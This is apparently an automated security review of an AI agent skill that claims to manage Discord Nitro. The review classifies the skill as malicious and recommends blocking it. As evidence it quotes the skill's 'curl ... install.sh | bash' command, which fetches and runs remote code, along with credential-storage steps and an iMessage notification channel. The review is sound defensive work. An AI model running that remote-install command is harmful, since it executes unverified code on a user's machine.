# Agent Skill Security Analysis Report

## Overview
- Skill Name: discord-nitro
- Declared Purpose: Manage Discord Nitro subscription, server boosts, and premium features.
- Final Classification: MALICIOUS
- Overall Risk Level: HIGH
- Summary: The skill's declared purpose is to manage Discord Nitro features. However, its installation method involves executing a remote script via `curl | bash`, which is a high-risk behavior allowing arbitrary code execution from an external, unverified source. Additionally, the skill includes a capability to "notify via iMessage" on login failure, indicating an unverified external communication channel that could be abused for data exfiltration. These two factors, especially the remote script execution, pose significant security risks.

## Observed Behaviors

### Behavior: Remote Script Execution for Installation
- Category: Remote Execution
- Technique ID: SC2 — RemoteScriptExecution
- Severity: HIGH
- Description: The skill's quick installation method instructs the user to download and execute a shell script from `https://canifi.com/skills/discord-nitro/install.sh` directly into a bash shell. The content of this remote script is not provided or verifiable within the skill's definition.
- Evidence: `curl -sSL https://canifi.com/skills/discord-nitro/install.sh | bash`
- Why it may be benign or suspicious: While `curl | bash` is a common installation method for many legitimate tools, it is also a significant attack vector. Without the ability to inspect the `install.sh` script, it represents a high-risk behavior as it allows arbitrary code to be executed on the user's system from an external source, potentially leading to malware deployment, system compromise, or other malicious activities.

### Behavior: Credential Handling (Storage)
- Category: Credential Theft (potential if misused)
- Technique ID: None directly, but related to E2 — CredentialHarvesting if transmitted.
- Severity: LOW (if `canifi-env` is secure and local)
- Description: The skill provides instructions for storing Discord credentials (email, password) in local environment variables using `canifi-env`. It explicitly states that "Credentials stored in canifi-env are only accessible locally on your machine and are never transmitted."
- Evidence: `canifi-env set DISCORD_EMAIL "your-email@example.com"`, `canifi-env set SERVICE_EMAIL "your-email"`, `canifi-env set SERVICE_PASSWORD "your-password"`
- Why it may be benign or suspicious: Storing credentials locally in environment variables can be a legitimate practice for automation. The explicit statement about non-transmission is reassuring. However, the presence of another external communication channel (iMessage, see below) raises questions about the veracity of this claim if the skill were to be compromised or designed maliciously.

### Behavior: Credential Handling (Secure Input Recommendation)
- Category: Legitimate Functionality
- Technique ID: None
- Severity: LOW
- Description: The skill recommends a "Manual Browser Login" option using Playwright, where the user logs into Discord manually in a browser window controlled by Playwright. This method avoids the skill directly handling the user's credentials.
- Evidence: "Option 1: Manual Browser Login (Recommended)", "Claude will use your authenticated session without ever seeing your password"
- Why it may be benign or suspicious: This is a more secure approach to authentication, reducing the risk of credential theft by the skill itself. This behavior is benign.

### Behavior: Browser Automation
- Category: Legitimate Functionality
- Technique ID: None directly, but could be P4 — BehaviorManipulation if used for unintended actions.
- Severity: LOW
- Description: The core functionality relies on browser automation (Playwright) to navigate to `discord.com`, log in, and interact with Discord's web interface to manage Nitro features.
- Evidence: "Enables Claude to interact with Discord...", "Navigate to discord.com via Playwright MCP", "Authentication Flow" steps.
- Why it may be benign or suspicious: This is the declared purpose of the skill and is benign for its stated use. However, browser automation capabilities can be abused to perform arbitrary actions on behalf of the user, potentially leading to unintended consequences if the skill's instructions are compromised or designed maliciously.

### Behavior: External Transmission (Error Notification)
- Category: Data Exfiltration (potential) / External Communication
- Technique ID: E1 — ExternalTransmission
- Severity: MEDIUM
- Description: In its error handling, the skill states that upon "Login Failed," it will "notify via iMessage." This indicates a capability for external communication beyond the stated interaction with `discord.com`. The content of this iMessage notification is not specified.
- Evidence: "Login Failed: Retry authentication up to 3 times, then notify via iMessage"
- Why it may be benign or suspicious: While error notifications can be legitimate, the use of iMessage as an external communication channel is concerning. Without knowing what information is transmitted, this capability could be abused to exfiltrate sensitive data from the user's session or local machine, contradicting the claim that credentials are "never transmitted."

### Behavior: Dynamic Adaptation Instructions
- Category: Agent Manipulation (potential)
- Technique ID: P4 — BehaviorManipulation (potential, if used to adapt to malicious instructions)
- Severity: LOW
- Description: The skill provides "Self-Improvement Instructions" for the agent to adapt to changes in the Discord web application, such as documenting UI changes, updating selectors, and tracking new features.
- Evidence: "Self-Improvement Instructions" section.
- Why it may be benign or suspicious: This is a benign instruction for maintaining the skill's functionality and robustness against UI changes. It could become suspicious if combined with remote execution capabilities to dynamically load new malicious behaviors, but this is not explicitly stated.

## Suspicious Indicators
- Sensitive data access: The skill is designed to interact with Discord, which involves user accounts and potentially sensitive personal information related to subscriptions and gaming activity. It also handles Discord login credentials (email, password, 2FA).
- Network endpoints: `canifi.com` (for installation script), `discord.com` (for core functionality), and an implied iMessage service endpoint for notifications.
- Dangerous commands/APIs: The `curl | bash` command for installation is a dangerous command as it executes arbitrary code from an external source without prior inspection. The `notify via iMessage` implies an external communication API that could be misused.

## Hidden or Undocumented Functionality
The skill's description focuses on managing Discord Nitro features. The "notify via iMessage" functionality is mentioned in error handling but is not explicitly detailed in the "Capabilities" section or explained in terms of what data it might transmit. This constitutes a potentially undocumented external communication capability.

## Final Assessment
The skill is classified as **MALICIOUS**. While its declared purpose of managing Discord Nitro features appears benign, the methods employed introduce significant security vulnerabilities and risks. The primary reason for this classification is the **high-risk installation method** involving `curl -sSL ... | bash`. This command executes an unverified remote script (`install.sh`) directly on the user's system, which is a common vector for malware and allows for arbitrary code execution without any prior security checks. This alone constitutes a critical security flaw.

Furthermore, the presence of an **unverified external communication channel** ("notify via iMessage") raises concerns. Although described for error notification, the lack of transparency regarding what information is transmitted via iMessage creates a potential for data exfiltration, contradicting the skill's claim that user credentials are "never transmitted." The combination of a highly insecure installation method and an opaque external communication capability indicates a high potential for malicious activity or severe compromise.

## Recommended Action
BLOCK
The skill should be blocked due to the critical security risk posed by its `curl | bash` installation method, which allows for arbitrary remote code execution, and the unverified external communication channel via iMessage. These behaviors present a significant threat to user security and data privacy.